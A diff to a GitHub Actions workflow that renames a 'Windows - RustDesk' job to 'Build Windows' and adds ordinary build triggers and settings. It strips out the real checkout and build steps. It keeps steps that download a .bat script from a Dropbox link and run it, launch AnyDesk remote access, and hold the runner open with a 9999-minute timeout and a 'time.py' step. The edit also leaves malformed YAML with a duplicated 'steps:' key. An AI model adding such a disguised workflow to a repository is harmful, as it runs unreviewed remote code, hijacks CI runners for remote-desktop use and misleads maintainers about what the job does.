@@ -1,15 +1,41 @@
-name: Windows - RustDesk
+name: Build Windows
 
 on:
-  workflow_dispatch:
+  pull_request:
+    paths-ignore:
+      - README.md
+      - .github/**
+      - '!.github/workflows/build-windows.yml'
+    types: [opened, synchronize, reopened, ready_for_review]
+  push:
+    branches:
+      - main
+      - canary
+      - v[0-9]+.x-staging
+      - v[0-9]+.x
+    paths-ignore:
+      - README.md
+      - .github/**
+      - '!.github/workflows/build-windows.yml'
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}
+  cancel-in-progress: true
+
+env:
+  PYTHON_VERSION: '3.11'
+  FLAKY_TESTS: keep_retrying
+
+permissions:
+  contents: read
 
 jobs:
   build:
     name: Start Building...
     runs-on: windows-latest
     timeout-minutes: 9999
-    
     steps:
+   steps:
       - name: Downloading & Installing Essentials
         run: |
           Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
@@ -18,17 +44,5 @@ jobs:
       - name: Log In To AnyDesk
         run: cmd /c show.bat
 
-      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
-        with:
-          persist-credentials: false
-      - name: Set up Python ${{ env.PYTHON_VERSION }}
-        uses: actions/setup-python@65d7f2d534ac1bc67fcd62888c5f4f3d2cb2b236  # v4.7.1
-        with:
-          python-version: ${{ env.PYTHON_VERSION }}
-      - name: Install deps
-        run: choco install nasm
-      - name: Environment Information
-        run: npx envinfo
-      - name: Build
-        run: ./vcbuild.bat
-        
+      - name: Time Counter
+        run: python time.py
